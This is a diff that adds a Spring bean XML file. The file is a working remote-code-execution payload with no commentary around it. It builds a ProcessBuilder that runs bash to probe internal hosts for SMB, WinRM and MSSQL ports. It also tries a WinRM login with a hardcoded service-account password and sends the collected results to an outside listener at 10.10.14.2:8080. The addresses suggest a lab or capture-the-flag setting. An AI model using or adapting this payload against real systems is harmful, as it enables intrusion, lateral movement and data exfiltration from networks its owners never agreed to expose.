@@ -1,0 +1,36 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans
+       http://www.springframework.org/schema/beans/spring-beans.xsd">
+    <bean id="pb" class="java.lang.ProcessBuilder">
+        <constructor-arg>
+            <list>
+                <value>/bin/bash</value>
+                <value>-c</value>
+                <value><![CDATA[
+SQL_PING=$(timeout 3 bash -c "echo >/dev/tcp/172.16.1.101/445" 2>&1 && echo "SQL_SMB_OPEN" || echo "SQL_SMB_CLOSED");
+SQL_WRM=$(timeout 3 bash -c "echo >/dev/tcp/172.16.1.101/5985" 2>&1 && echo "SQL_WINRM_OPEN" || echo "SQL_WINRM_CLOSED");
+SQL_SQL=$(timeout 3 bash -c "echo >/dev/tcp/172.16.1.101/1433" 2>&1 && echo "SQL_MSSQL_OPEN" || echo "SQL_MSSQL_CLOSED");
+DC_WRM=$(timeout 3 bash -c "echo >/dev/tcp/172.16.1.1/5985" 2>&1 && echo "DC_WINRM_OPEN" || echo "DC_WINRM_CLOSED");
+DC_SMB=$(timeout 3 bash -c "echo >/dev/tcp/172.16.1.1/445" 2>&1 && echo "DC_SMB_OPEN" || echo "DC_SMB_CLOSED");
+DC_WINRM_AUTH=$(curl -s -m 5 -u 'svc_laps:16bmxkingm@' 'http://172.16.1.1:5985/wsman' -d '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:wsman="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"><s:Header><wsman:ResourceURI s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_OperatingSystem</wsman:ResourceURI><wsman:Action s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/enumeration/Enumerate</wsman:Action><wsman:SelectorSet><wsman:Selector Name="__cimnamespace">root/cimv2</wsman:Selector></wsman:SelectorSet></s:Header><s:Body><wsman:EnumerateOperation/></s:Body></s:Envelope>' -H 'Content-Type: application/soap+xml;charset=UTF-8' 2>&1 | head -3);
+echo "=PORTS=$SQL_PING $SQL_WRM $SQL_SQL $DC_WRM $DC_SMB=WINRM_TEST=$DC_WINRM_AUTH"
+]]></value>
+            </list>
+        </constructor-arg>
+    </bean>
+    <bean id="proc" factory-bean="pb" factory-method="start"/>
+    <bean id="procOut" factory-bean="proc" factory-method="getInputStream"/>
+    <bean id="outBytes" class="org.springframework.util.FileCopyUtils"
+          factory-method="copyToByteArray">
+        <constructor-arg ref="procOut"/>
+    </bean>
+    <bean id="outStr" class="java.lang.String">
+        <constructor-arg ref="outBytes"/>
+    </bean>
+    <bean id="outUrl" class="java.net.URL" depends-on="outStr">
+        <constructor-arg value="#{'http://10.10.14.2:8080/portscan?v=' + T(java.net.URLEncoder).encode(@outStr,'UTF-8')}"/>
+    </bean>
+    <bean id="outReq" factory-bean="outUrl" factory-method="openStream" depends-on="outUrl"/>
+</beans>
